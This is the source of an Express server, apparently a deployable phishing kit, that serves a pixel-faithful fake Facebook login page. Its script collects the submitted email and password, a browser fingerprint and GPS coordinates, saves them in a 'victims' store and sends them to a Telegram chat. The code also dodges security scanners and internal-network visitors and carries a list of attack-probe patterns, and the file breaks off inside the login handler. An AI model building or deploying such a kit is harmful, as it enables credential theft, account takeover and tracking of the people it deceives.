// server.js - Ultra Secure Advanced Phishing Tracker v2.0
// Work di Vercel & Anti Detection

const express = require('express');
const crypto = require('crypto');
const app = express();

// ==================== CONFIGURASI TINGKAT TINGGI ====================
const CONFIG = {
    // Telegram Configuration
    TELEGRAM_BOT_TOKEN: process.env.BOT_TOKEN || 'YOUR_TELEGRAM_BOT_TOKEN',
    TELEGRAM_CHAT_ID: process.env.CHAT_ID || 'YOUR_CHAT_ID',
    
    // Security Configuration
    ENCRYPTION_KEY: process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex'),
    SESSION_SECRET: crypto.randomBytes(32).toString('hex'),
    ADMIN_PASSWORD: process.env.ADMIN_PASS || 'UltraSecurePass2024!',
    
    // Server Configuration
    PORT: process.env.PORT || 3000,
    NODE_ENV: process.env.NODE_ENV || 'production',
    
    // Tracking Configuration
    DATA_FILE: '/tmp/victims_encrypted.json',
    LOG_FILE: '/tmp/access_logs.enc',
    MAX_VICTIMS: 1000,
    
    // Stealth Configuration
    FAKE_TITLE: 'Facebook - Log In or Sign Up',
    FAKE_DOMAIN: 'facebook-login-secure.com',
    REDIRECT_URL: 'https://www.facebook.com/login',
    
    // DNS Bypass Configuration
    CLOUDFLARE_PROXY: true,
    USE_CUSTOM_DNS: true,
    DNS_OVERRIDE: ['8.8.8.8', '1.1.1.1']
};

// ==================== ENCRYPTION SYSTEM ====================
class EncryptionSystem {
    constructor() {
        this.algorithm = 'aes-256-gcm';
        this.key = Buffer.from(CONFIG.ENCRYPTION_KEY, 'hex');
    }

    encrypt(text) {
        try {
            const iv = crypto.randomBytes(16);
            const cipher = crypto.createCipheriv(this.algorithm, this.key, iv);
            let encrypted = cipher.update(text, 'utf8', 'hex');
            encrypted += cipher.final('hex');
            const tag = cipher.getAuthTag();
            return {
                iv: iv.toString('hex'),
                encrypted,
                tag: tag.toString('hex')
            };
        } catch (error) {
            console.error('Encryption error:', error);
            return null;
        }
    }

    decrypt(encryptedData) {
        try {
            const decipher = crypto.createDecipheriv(
                this.algorithm,
                this.key,
                Buffer.from(encryptedData.iv, 'hex')
            );
            decipher.setAuthTag(Buffer.from(encryptedData.tag, 'hex'));
            let decrypted = decipher.update(encryptedData.encrypted, 'hex', 'utf8');
            decrypted += decipher.final('utf8');
            return decrypted;
        } catch (error) {
            console.error('Decryption error:', error);
            return null;
        }
    }

    hashData(data) {
        return crypto.createHash('sha256').update(JSON.stringify(data)).digest('hex');
    }
}

// Initialize encryption
const encryptor = new EncryptionSystem();

// ==================== ADVANCED VICTIM TRACKING ====================
class VictimTracker {
    constructor() {
        this.victims = new Map();
        this.sessions = new Map();
        this.loadData();
        this.startAutoSave();
    }

    loadData() {
        try {
            const fs = require('fs');
            if (fs.existsSync(CONFIG.DATA_FILE)) {
                const encryptedData = JSON.parse(fs.readFileSync(CONFIG.DATA_FILE, 'utf8'));
                const decrypted = encryptor.decrypt(encryptedData);
                if (decrypted) {
                    const data = JSON.parse(decrypted);
                    this.victims = new Map(data.victims || []);
                    console.log(`📂 Loaded ${this.victims.size} victims from secure storage`);
                }
            }
        } catch (error) {
            console.log('Starting with fresh database');
        }
    }

    saveData() {
        try {
            const fs = require('fs');
            const data = {
                victims: Array.from(this.victims.entries()),
                timestamp: Date.now(),
                hash: crypto.randomBytes(16).toString('hex')
            };
            
            const encrypted = encryptor.encrypt(JSON.stringify(data));
            if (encrypted) {
                fs.writeFileSync(CONFIG.DATA_FILE, JSON.stringify(encrypted));
            }
        } catch (error) {
            console.error('Error saving data:', error);
        }
    }

    startAutoSave() {
        setInterval(() => this.saveData(), 60000); // Auto save setiap 1 menit
    }

    addVictim(victimData) {
        const victimId = `victim_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
        
        // Enhanced victim data
        const enhancedData = {
            id: victimId,
            ...victimData,
            tracking_id: crypto.randomBytes(12).toString('hex'),
            fingerprint: this.generateFingerprint(victimData),
            timestamp: new Date().toISOString(),
            status: 'active',
            security_level: 'high',
            data_hash: encryptor.hashData(victimData)
        };

        this.victims.set(victimId, enhancedData);
        
        // Log access
        this.logAccess(victimId, 'victim_added');
        
        return enhancedData;
    }

    generateFingerprint(victimData) {
        const fingerprintData = {
            browser: victimData.browser || {},
            screen: victimData.screen || {},
            plugins: victimData.plugins || [],
            timezone: victimData.timezone,
            languages: victimData.languages || []
        };
        
        return crypto
            .createHash('sha256')
            .update(JSON.stringify(fingerprintData))
            .digest('hex')
            .substring(0, 32);
    }

    getVictim(id) {
        return this.victims.get(id);
    }

    getVictims(limit = 50) {
        return Array.from(this.victims.values())
            .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
            .slice(0, limit);
    }

    getStats() {
        const victims = Array.from(this.victims.values());
        const now = new Date();
        const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
        
        return {
            total: victims.length,
            today: victims.filter(v => new Date(v.timestamp) >= today).length,
            with_location: victims.filter(v => v.location).length,
            with_camera: victims.filter(v => v.camera_data).length,
            unique_countries: [...new Set(victims.map(v => v.country).filter(Boolean))].length,
            last_24h: victims.filter(v => 
                new Date(v.timestamp) >= new Date(now.getTime() - 24 * 60 * 60 * 1000)
            ).length
        };
    }

    logAccess(victimId, action, details = '') {
        const logEntry = {
            timestamp: new Date().toISOString(),
            victimId,
            action,
            details,
            ip: 'system'
        };
        
        // Save to encrypted log
        this.saveToEncryptedLog(logEntry);
    }

    saveToEncryptedLog(data) {
        try {
            const fs = require('fs');
            const encrypted = encryptor.encrypt(JSON.stringify(data));
            if (encrypted) {
                fs.appendFileSync(CONFIG.LOG_FILE, JSON.stringify(encrypted) + '\n', 'utf8');
            }
        } catch (error) {
            console.error('Error saving log:', error);
        }
    }
}

// Initialize tracker
const tracker = new VictimTracker();

// ==================== TELEGRAM BOT SERVICE ====================
class TelegramService {
    constructor() {
        this.bot = null;
        this.initialize();
    }

    async initialize() {
        if (!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN') {
            console.warn('⚠️ Telegram bot token not configured. Alerts disabled.');
            return;
        }

        try {
            const TelegramBot = require('node-telegram-bot-api');
            this.bot = new TelegramBot(CONFIG.TELEGRAM_BOT_TOKEN, { polling: false });
            
            // Test connection
            const botInfo = await this.bot.getMe();
            console.log(`✅ Telegram Bot Connected: @${botInfo.username}`);
            
            // Send startup message
            await this.sendAlert('🚀 *Advanced Phishing Tracker Started*', {
                status: 'online',
                timestamp: new Date().toISOString(),
                victims_count: tracker.victims.size
            });
            
        } catch (error) {
            console.error('❌ Telegram bot initialization failed:', error.message);
            this.bot = null;
        }
    }

    async sendAlert(message, data = null) {
        if (!this.bot || !CONFIG.TELEGRAM_CHAT_ID) return false;

        try {
            let fullMessage = `🔔 *${message}* 🔔\n\n`;
            
            if (data) {
                if (data.credentials) {
                    fullMessage += `👤 *Email/Phone:* ${data.credentials.email || data.credentials.phone || 'N/A'}\n`;
                    fullMessage += `🔑 *Password:* \`${data.credentials.password || 'N/A'}\`\n`;
                }
                
                if (data.location) {
                    fullMessage += `📍 *Location:* ${data.location.city || 'Unknown'}, ${data.location.country || 'Unknown'}\n`;
                    if (data.location.latitude && data.location.longitude) {
                        fullMessage += `🌐 *Coordinates:* ${data.location.latitude}, ${data.location.longitude}\n`;
                        fullMessage += `🗺️ *Google Maps:* https://maps.google.com/?q=${data.location.latitude},${data.location.longitude}\n`;
                    }
                }
                
                if (data.ip) fullMessage += `📡 *IP Address:* \`${data.ip}\`\n`;
                if (data.browser) fullMessage += `🌐 *Browser:* ${data.browser.name || 'Unknown'} ${data.browser.version || ''}\n`;
                if (data.platform) fullMessage += `💻 *Platform:* ${data.platform}\n`;
                if (data.device) fullMessage += `📱 *Device:* ${data.device.type || 'Desktop'} ${data.device.model || ''}\n`;
                
                fullMessage += `🕐 *Time:* ${new Date().toLocaleString()}\n`;
                fullMessage += `📊 *Total Victims:* ${tracker.victims.size}\n`;
                
                if (data.tracking_id) {
                    fullMessage += `🔢 *Tracking ID:* \`${data.tracking_id}\`\n`;
                }
            }
            
            // Split long messages
            const maxLength = 4096;
            if (fullMessage.length > maxLength) {
                const parts = [];
                while (fullMessage.length > 0) {
                    parts.push(fullMessage.substring(0, maxLength));
                    fullMessage = fullMessage.substring(maxLength);
                }
                
                for (const part of parts) {
                    await this.bot.sendMessage(CONFIG.TELEGRAM_CHAT_ID, part, { 
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true 
                    });
                    await new Promise(resolve => setTimeout(resolve, 500));
                }
            } else {
                await this.bot.sendMessage(CONFIG.TELEGRAM_CHAT_ID, fullMessage, { 
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true 
                });
            }
            
            // Send location if available
            if (data?.location?.latitude && data?.location?.longitude) {
                try {
                    await this.bot.sendLocation(
                        CONFIG.TELEGRAM_CHAT_ID,
                        data.location.latitude,
                        data.location.longitude,
                        {
                            disable_notification: false
                        }
                    );
                } catch (locationError) {
                    console.warn('Could not send location:', locationError.message);
                }
            }
            
            return true;
            
        } catch (error) {
            console.error('Telegram send error:', error.message);
            return false;
        }
    }

    async sendLoginAlert(victimData) {
        return this.sendAlert('🔐 LOGIN CAPTURED', victimData);
    }

    async sendCompleteAlert(victimData) {
        return this.sendAlert('✅ VERIFICATION COMPLETE', victimData);
    }

    async sendDetailedReport(victimData) {
        const report = `
📊 *DETAILED VICTIM REPORT*

*BASIC INFO*
🆔 Tracking ID: \`${victimData.tracking_id}\`
👤 Email: ${victimData.credentials?.email || 'N/A'}
📱 Phone: ${victimData.credentials?.phone || 'N/A'}
🔑 Password: \`${victimData.credentials?.password || 'N/A'}\`

*LOCATION DATA*
🌐 IP: \`${victimData.ip || 'N/A'}\`
📍 Country: ${victimData.location?.country || 'N/A'}
🏙️ City: ${victimData.location?.city || 'N/A'}
📏 Accuracy: ${victimData.location?.accuracy || 'N/A'}m
🌍 Timezone: ${victimData.timezone || 'N/A'}

*DEVICE INFO*
💻 Platform: ${victimData.platform || 'N/A'}
🌐 Browser: ${victimData.browser?.name || 'N/A'} ${victimData.browser?.version || ''}
📱 Device: ${victimData.device?.type || 'Desktop'} ${victimData.device?.model || ''}
🖥️ Screen: ${victimData.screen?.width || 0}x${victimData.screen?.height || 0}
🎮 Cores: ${victimData.cpu_cores || 'N/A'}
💾 RAM: ${victimData.ram || 'N/A'} GB

*NETWORK INFO*
📶 Connection: ${victimData.connection?.type || 'N/A'}
⚡ Downlink: ${victimData.connection?.downlink || 'N/A'} Mbps
⏱️ RTT: ${victimData.connection?.rtt || 'N/A'} ms

*FINGERPRINT*
🔢 Fingerprint: \`${victimData.fingerprint?.substring(0, 16)}...\`
🛡️ Security Level: ${victimData.security_level || 'medium'}

*TIMESTAMPS*
⏰ Login: ${victimData.credentials?.timestamp || 'N/A'}
📅 Captured: ${victimData.timestamp || 'N/A'}
🔄 Session: ${victimData.session_duration || 'N/A'}s

*ADDITIONAL DATA*
🎥 Camera: ${victimData.camera_data ? '✅ Yes' : '❌ No'}
🎤 Microphone: ${victimData.microphone_data ? '✅ Yes' : '❌ No'}
📍 GPS: ${victimData.gps_data ? '✅ Yes' : '❌ No'}
📱 Sensors: ${victimData.sensors?.length || 0} detected
🔌 Plugins: ${victimData.plugins?.length || 0} installed
        `;
        
        return this.sendAlert('📋 DETAILED REPORT', { custom_report: report });
    }
}

// Initialize Telegram service
const telegramService = new TelegramService();

// ==================== SECURITY MIDDLEWARE ====================
const securityMiddleware = {
    // Anti-Scanner Protection
    detectScanners(req) {
        const userAgent = (req.headers['user-agent'] || '').toLowerCase();
        const path = req.path.toLowerCase();
        
        const scannerPatterns = [
            'nmap', 'sqlmap', 'nikto', 'acunetix', 'nessus',
            'openvas', 'metasploit', 'burp', 'zap', 'w3af',
            'dirb', 'gobuster', 'wfuzz', 'sql injection',
            'xss', 'scanner', 'crawler', 'spider', 'bot'
        ];
        
        const ip = req.ip || req.connection.remoteAddress;
        const suspiciousIPs = [
            '127.0.0.1',
            '192.168.',
            '10.',
            '172.16.',
            '172.31.'
        ];
        
        // Check if IP is suspicious
        if (suspiciousIPs.some(pattern => ip.startsWith(pattern))) {
            return 'internal_network';
        }
        
        // Check for scanners in User-Agent
        if (scannerPatterns.some(pattern => userAgent.includes(pattern))) {
            return 'security_scanner';
        }
        
        // Check for common attack patterns in URL
        const attackPatterns = [
            'union select', 'sleep(', 'waitfor delay',
            'benchmark', 'pg_sleep', 'or 1=1',
            'admin\'--', '\' or \'1\'=\'1',
            '../../', 'etc/passwd', '.git/', '.env',
            'phpinfo', 'config.php', 'backup.sql'
        ];
        
        const url = (req.url || '').toLowerCase();
        if (attackPatterns.some(pattern => url.includes(pattern))) {
            return 'sql_injection';
        }
        
        return 'legitimate';
    },
    
    // Rate Limiting
    rateLimit: new Map(),
    
    checkRateLimit(req) {
        const ip = req.ip || req.connection.remoteAddress;
        const now = Date.now();
        const windowMs = 15 * 60 * 1000; // 15 minutes
        const maxRequests = 50;
        
        if (!this.rateLimit.has(ip)) {
            this.rateLimit.set(ip, { count: 1, timestamp: now });
            return true;
        }
        
        const data = this.rateLimit.get(ip);
        
        if (now - data.timestamp > windowMs) {
            data.count = 1;
            data.timestamp = now;
            return true;
        }
        
        if (data.count >= maxRequests) {
            return false;
        }
        
        data.count++;
        return true;
    },
    
    // Clean old rate limit entries
    cleanRateLimit() {
        const now = Date.now();
        const windowMs = 15 * 60 * 1000;
        
        for (const [ip, data] of this.rateLimit.entries()) {
            if (now - data.timestamp > windowMs) {
                this.rateLimit.delete(ip);
            }
        }
    },
    
    // Generate secure session
    generateSecureSession() {
        return {
            id: crypto.randomBytes(32).toString('hex'),
            token: crypto.randomBytes(64).toString('hex'),
            created: Date.now(),
            expires: Date.now() + (24 * 60 * 60 * 1000), // 24 hours
            data: {}
        };
    },
    
    // Validate session
    validateSession(sessionId, token) {
        // In production, this would check against a session store
        return sessionId && token && sessionId.length === 64 && token.length === 128;
    }
};

// Clean rate limit every hour
setInterval(() => securityMiddleware.cleanRateLimit(), 60 * 60 * 1000);

// ==================== EXPRESS APP SETUP ====================
app.disable('x-powered-by');
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Custom middleware untuk security
app.use((req, res, next) => {
    // Check for scanners
    const scannerType = securityMiddleware.detectScanners(req);
    if (scannerType !== 'legitimate') {
        console.warn(`🚫 Blocked ${scannerType}: ${req.ip} - ${req.headers['user-agent']}`);
        
        // Return fake response untuk scanner
        if (scannerType === 'security_scanner') {
            return res.status(403).send('Access Forbidden');
        }
        
        // Return empty page untuk internal network
        if (scannerType === 'internal_network') {
            return res.send(`
            <!DOCTYPE html>
            <html>
            <head><title>Page Not Found</title></head>
            <body><h1>404 - Page Not Found</h1></body>
            </html>
            `);
        }
        
        return res.status(404).send('Not Found');
    }
    
    // Rate limiting
    if (!securityMiddleware.checkRateLimit(req)) {
        return res.status(429).send('Too Many Requests');
    }
    
    // Add security headers
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Referrer-Policy', 'no-referrer');
    res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
    
    // Generate session jika belum ada
    if (!req.cookies?.session_id) {
        const session = securityMiddleware.generateSecureSession();
        res.cookie('session_id', session.id, {
            httpOnly: true,
            secure: CONFIG.NODE_ENV === 'production',
            sameSite: 'strict',
            maxAge: 24 * 60 * 60 * 1000
        });
        req.session = session;
    } else {
        req.session = {
            id: req.cookies.session_id,
            data: {}
        };
    }
    
    next();
});

// ==================== ROUTES ====================

// Landing Page - Fake Facebook Login (Ultra Realistic)
app.get('/', (req, res) => {
    const sessionId = req.session.id;
    const victimId = `fb_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
    
    // Log access
    tracker.logAccess(victimId, 'landing_page_visit', {
        session: sessionId,
        user_agent: req.headers['user-agent']
    });
    
    res.send(`
    <!DOCTYPE html>
    <html lang="en" dir="ltr">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <title>${CONFIG.FAKE_TITLE}</title>
        <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yT/r/aGT3gskzWBf.ico">
        <style>
            /* Facebook Exact Styles */
            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
                font-family: Helvetica, Arial, sans-serif;
            }
            
            body {
                background-color: #f0f2f5;
                color: #1c1e21;
                line-height: 1.34;
            }
            
            .container {
                max-width: 980px;
                margin: 0 auto;
                padding: 72px 0 112px;
            }
            
            .row {
                display: flex;
                align-items: center;
                justify-content: space-between;
                flex-wrap: wrap;
            }
            
            .intro {
                flex: 0 0 580px;
                padding-right: 32px;
            }
            
            .intro h1 {
                color: #1877f2;
                font-size: 55px;
                font-weight: bold;
                margin-bottom: 16px;
            }
            
            .intro h2 {
                font-size: 28px;
                font-weight: normal;
                line-height: 32px;
            }
            
            .login-panel {
                flex: 0 0 396px;
            }
            
            .login-box {
                background-color: #fff;
                border: none;
                border-radius: 8px;
                box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
                padding: 20px;
                width: 100%;
            }
            
            .login-box input {
                width: 100%;
                padding: 14px 16px;
                border: 1px solid #dddfe2;
                border-radius: 6px;
                font-size: 17px;
                margin-bottom: 12px;
                color: #1d2129;
            }
            
            .login-box input:focus {
                outline: none;
                border-color: #1877f2;
                box-shadow: 0 0 0 2px #e7f3ff;
            }
            
            .login-btn {
                background-color: #1877f2;
                border: none;
                border-radius: 6px;
                font-size: 20px;
                line-height: 48px;
                padding: 0 16px;
                width: 100%;
                color: #fff;
                font-weight: bold;
                cursor: pointer;
                transition: background-color 0.3s;
            }
            
            .login-btn:hover {
                background-color: #166fe5;
            }
            
            .forgot-password {
                display: block;
                text-align: center;
                color: #1877f2;
                font-size: 14px;
                text-decoration: none;
                margin: 16px 0;
                padding-bottom: 16px;
                border-bottom: 1px solid #dadde1;
            }
            
            .forgot-password:hover {
                text-decoration: underline;
            }
            
            .create-account {
                background-color: #42b72a;
                border: none;
                border-radius: 6px;
                font-size: 17px;
                line-height: 48px;
                padding: 0 16px;
                color: #fff;
                font-weight: bold;
                cursor: pointer;
                transition: background-color 0.3s;
                display: block;
                margin: 0 auto;
                margin-top: 24px;
            }
            
            .create-account:hover {
                background-color: #36a420;
            }
            
            .create-page {
                text-align: center;
                margin-top: 28px;
                color: #1c1e21;
                font-size: 14px;
            }
            
            .create-page a {
                color: #1c1e21;
                font-weight: bold;
                text-decoration: none;
            }
            
            .create-page a:hover {
                text-decoration: underline;
            }
            
            .security-badge {
                background: #e7f3ff;
                border: 1px solid #1877f2;
                border-radius: 6px;
                padding: 12px;
                margin-top: 15px;
                text-align: center;
                color: #1877f2;
                font-size: 14px;
            }
            
            .security-badge i {
                margin-right: 8px;
            }
            
            /* Mobile Responsive */
            @media (max-width: 900px) {
                .row {
                    flex-direction: column;
                    text-align: center;
                }
                
                .intro {
                    padding-right: 0;
                    margin-bottom: 40px;
                }
                
                .intro h1 {
                    font-size: 42px;
                }
                
                .intro h2 {
                    font-size: 24px;
                }
                
                .container {
                    padding: 20px;
                }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="row">
                <div class="intro">
                    <h1>facebook</h1>
                    <h2>Facebook helps you connect and share with the people in your life.</h2>
                </div>
                <div class="login-panel">
                    <div class="login-box">
                        <form id="loginForm" onsubmit="return submitLogin(event)">
                            <input type="text" id="email" name="email" placeholder="Email address or phone number" required autofocus>
                            <input type="password" id="pass" name="pass" placeholder="Password" required>
                            <button type="submit" class="login-btn" id="loginBtn">Log In</button>
                            <a href="#" class="forgot-password" onclick="showForgotPassword()">Forgotten password?</a>
                            <hr style="border: none; border-top: 1px solid #dadde1; margin: 20px 0;">
                            <button type="button" class="create-account" onclick="showCreateAccount()">Create New Account</button>
                        </form>
                        <div class="security-badge">
                            <i class="fas fa-shield-alt"></i>
                            Protected by Facebook Security
                        </div>
                    </div>
                    <div class="create-page">
                        <a href="#" style="font-weight: bold;">Create a Page</a> for a celebrity, brand or business.
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Footer (Facebook Exact) -->
        <div style="background: #fff; padding: 20px 0; margin-top: 40px; border-top: 1px solid #dddfe2;">
            <div style="max-width: 980px; margin: 0 auto; padding: 0 32px; font-size: 12px; color: #8a8d91;">
                <div style="margin-bottom: 10px;">
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">English (UK)</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Bahasa Indonesia</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">日本語</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Español</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Português (Brasil)</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none;"><i class="fas fa-plus"></i></a>
                </div>
                <hr style="border: none; border-top: 1px solid #dddfe2; margin: 10px 0;">
                <div>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Sign Up</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Log In</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Messenger</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Facebook Lite</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Video</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Places</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Games</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Marketplace</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Meta Pay</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Meta Store</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Meta Quest</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Instagram</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Threads</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Fundraisers</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Services</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Voting Information Centre</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Privacy Policy</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Privacy Centre</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Groups</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">About</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Create Ad</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Create Page</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Developers</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Careers</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Cookies</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">AdChoices</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Terms</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Help</a>
                    <a href="#" style="color: #8a8d91; text-decoration: none; margin-right: 20px;">Contact uploading and non-users</a>
                </div>
                <div style="margin-top: 20px; font-size: 11px;">
                    Meta © 2024
                </div>
            </div>
        </div>
        
        <!-- Font Awesome -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        
        <script>
            const victimId = '${victimId}';
            const sessionId = '${sessionId}';
            
            let collectedData = {
                session_id: sessionId,
                victim_id: victimId,
                url: window.location.href,
                referrer: document.referrer,
                timestamp: new Date().toISOString()
            };
            
            // Collect system information
            function collectSystemInfo() {
                collectedData.system = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                    deviceMemory: navigator.deviceMemory || 'unknown',
                    maxTouchPoints: navigator.maxTouchPoints || 0,
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelDepth: screen.pixelDepth,
                        availWidth: screen.availWidth,
                        availHeight: screen.availHeight
                    },
                    window: {
                        width: window.innerWidth,
                        height: window.innerHeight,
                        outerWidth: window.outerWidth,
                        outerHeight: window.outerHeight
                    },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    online: navigator.onLine
                };
                
                // Network info
                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
                collectedData.network = {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData,
                    type: connection.type
                };
                
                // Browser plugins
                collectedData.plugins = Array.from(navigator.plugins || []).map(p => ({
                    name: p.name,
                    description: p.description,
                    filename: p.filename,
                    length: p.length
                }));
                
                // Device detection
                const userAgent = navigator.userAgent.toLowerCase();
                collectedData.device = {
                    isMobile: /mobile|android|iphone|ipad|ipod/i.test(userAgent),
                    isTablet: /tablet|ipad/i.test(userAgent),
                    isDesktop: !/mobile|android|tablet|ipad|ipod/i.test(userAgent),
                    type: /mobile|android|iphone|ipad|ipod/i.test(userAgent) ? 'mobile' : 
                          /tablet|ipad/i.test(userAgent) ? 'tablet' : 'desktop',
                    model: userAgent.match(/(iphone|ipad|ipod|android|windows phone)/i)?.[0] || 'unknown'
                };
                
                // Browser detection
                collectedData.browser = {
                    name: getBrowserName(),
                    version: getBrowserVersion(),
                    engine: getBrowserEngine()
                };
                
                // CPU cores
                collectedData.cpu_cores = navigator.hardwareConcurrency || 'unknown';
                
                // RAM
                collectedData.ram = navigator.deviceMemory || 'unknown';
            }
            
            // Get browser name
            function getBrowserName() {
                const ua = navigator.userAgent;
                if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
                if (ua.includes('Edg')) return 'Edge';
                if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
                return 'Unknown';
            }
            
            function getBrowserVersion() {
                const ua = navigator.userAgent;
                let tem;
                let M = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\\/))\\/?\\s*(\\d+)/i) || [];
                if (/trident/i.test(M[1])) {
                    tem = /\\brv[ :]+(\\d+)/g.exec(ua) || [];
                    return 'IE ' + (tem[1] || '');
                }
                if (M[1] === 'Chrome') {
                    tem = ua.match(/\\b(OPR|Edg)\\/(\\d+)/);
                    if (tem != null) return tem.slice(1).join(' ');
                }
                M = M[2] ? [M[1], M[2]] : [navigator.appName, navigator.appVersion, '-?'];
                if ((tem = ua.match(/version\\/(\\d+)/i)) != null) M.splice(1, 1, tem[1]);
                return M.join(' ');
            }
            
            function getBrowserEngine() {
                const ua = navigator.userAgent;
                if (ua.includes('AppleWebKit')) return 'WebKit';
                if (ua.includes('Gecko')) return 'Gecko';
                if (ua.includes('Trident') || ua.includes('MSIE')) return 'Trident';
                if (ua.includes('EdgeHTML')) return 'EdgeHTML';
                return 'Unknown';
            }
            
            // Get IP address
            async function getIPAddress() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    try {
                        const response = await fetch('https://api64.ipify.org?format=json');
                        const data = await response.json();
                        return data.ip;
                    } catch (error2) {
                        return 'unknown';
                    }
                }
            }
            
            // Get location
            async function getLocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) {
                        resolve(null);
                        return;
                    }
                    
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude,
                                altitudeAccuracy: position.coords.altitudeAccuracy,
                                heading: position.coords.heading,
                                speed: position.coords.speed,
                                timestamp: position.timestamp
                            });
                        },
                        (error) => {
                            console.log('Geolocation error:', error.message);
                            resolve(null);
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                });
            }
            
            // Form submission
            async function submitLogin(event) {
                event.preventDefault();
                
                const email = document.getElementById('email').value;
                const password = document.getElementById('pass').value;
                const loginBtn = document.getElementById('loginBtn');
                
                if (!email || !password) {
                    alert('Please fill in all fields');
                    return false;
                }
                
                // Disable button and show loading
                loginBtn.disabled = true;
                loginBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Logging in...';
                
                // Collect system info
                collectSystemInfo();
                
                // Get IP address
                collectedData.ip = await getIPAddress();
                
                // Get location
                collectedData.location = await getLocation();
                
                // Add credentials
                collectedData.credentials = {
                    email: email,
                    password: password,
                    timestamp: new Date().toISOString()
                };
                
                // Send data to server
                try {
                    const response = await fetch('/api/track/login', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Victim-ID': victimId,
                            'X-Session-ID': sessionId
                        },
                        body: JSON.stringify(collectedData)
                    });
                    
                    const data = await response.json();
                    
                    if (data.success) {
                        // Show success message
